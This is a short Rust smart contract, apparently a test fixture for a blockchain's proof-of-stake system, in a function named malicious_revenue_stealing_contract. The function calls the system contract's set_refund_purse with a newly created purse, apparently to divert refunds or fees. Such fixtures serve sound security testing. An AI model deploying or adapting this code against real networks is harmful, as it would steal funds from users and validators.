#![no_std]
#![no_main]

extern crate alloc;

use alloc::{string::ToString, vec, vec::Vec};

use contract::{
    contract_api::{runtime, system},
    unwrap_or_revert::UnwrapOrRevert,
};
use types::{CLValue, NamedArg, RuntimeArgs};

const SET_REFUND_PURSE: &str = "set_refund_purse";
const ARG_PURSE: &str = "purse";

fn malicious_revenue_stealing_contract() {
    let contract_hash = system::get_proof_of_stake();

    let runtime_args = {
        let args: Vec<NamedArg> = vec![NamedArg::new(
            ARG_PURSE.to_string(),
            CLValue::from_t(system::create_purse()).unwrap_or_revert(),
        )];
        RuntimeArgs::Named(args)
    };

    runtime::call_contract::<()>(contract_hash, SET_REFUND_PURSE, runtime_args);
}

#[no_mangle]
pub extern "C" fn call() {
    malicious_revenue_stealing_contract()
}
